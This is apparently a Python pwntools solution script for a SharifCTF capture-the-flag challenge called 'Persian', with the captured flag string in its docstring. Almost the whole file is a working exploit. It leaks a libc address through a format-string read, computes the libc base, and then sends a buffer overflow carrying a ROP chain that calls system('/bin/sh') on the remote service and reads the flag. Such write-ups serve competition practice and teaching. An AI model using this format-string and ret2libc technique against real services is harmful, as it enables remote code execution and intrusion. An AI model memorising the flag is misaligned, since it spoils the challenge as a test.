#!/usr/bin/python

"""
$ cat home/rooney/suctf/Persian/flag
SharifCTF{369f022987ad5ad79ad026d88d194a16}
"""

from pwn import *
e = ELF("./libc.so.6") # Debian jessie 8 x86_64 libc

bin_sh = next(e.search("/bin/sh"))
system = e.symbols["system"]
pop_rdi = 0x0000000000022482

r = remote("ctf.sharif.edu", 54514)
libc_base = 0
r.sendline("%00009$s"+p64(0x600c80))
addr = r.recv(1024)
#print "recv", addr, "+++++++++++++", hexdump(addr)
addr = u64(addr[:6].ljust(8, "\x00"))
print "printf", hex(addr)
libc_base = addr - 0x0000000000069df0
print "libc_base", hex(libc_base)

bin_sh += libc_base
system += libc_base
pop_rdi += libc_base

r.sendline("A"*0x818+p64(pop_rdi)+p64(bin_sh)+p64(system))
#r.interactive()
r.sendline("cat home/rooney/suctf/Persian/flag")
r.recv()
r.recv()
print "flag: ", r.recv()
r.close()
